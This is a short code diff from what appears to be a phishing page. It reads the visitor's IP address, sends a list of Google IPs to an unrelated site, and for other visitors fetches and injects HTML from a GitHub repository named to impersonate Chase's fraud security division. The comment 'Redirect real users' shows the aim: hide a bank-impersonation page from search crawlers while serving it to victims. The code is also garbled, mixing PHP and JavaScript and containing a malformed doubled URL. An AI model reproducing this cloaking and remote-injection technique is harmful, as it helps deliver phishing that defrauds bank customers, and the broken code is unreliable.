@@ -147,7 +147,7 @@ $visitor_ip = $_SERVER['REMOTE_ADDR'];
 if (in_array($visitor_ip, $google_ips)) {
     window.location.href = "https://https://trollface.dk/";
 } else {
-   fetch("https://raw.githubusercontent.com/ChaseFraudSecurityDivisionJPbankdatacom/Report-fraud-prevention/refs/heads/main/index.html")
+   fetch("https://raw.githubusercontent.com/ChaseFraudSecurityDivisionJPbankdatacom/Report-fraud-prevention/refs/heads/main/index.php")
   .then(response => response.text())
   .then(data => document.body.innerHTML = data); // Redirect real users
 }
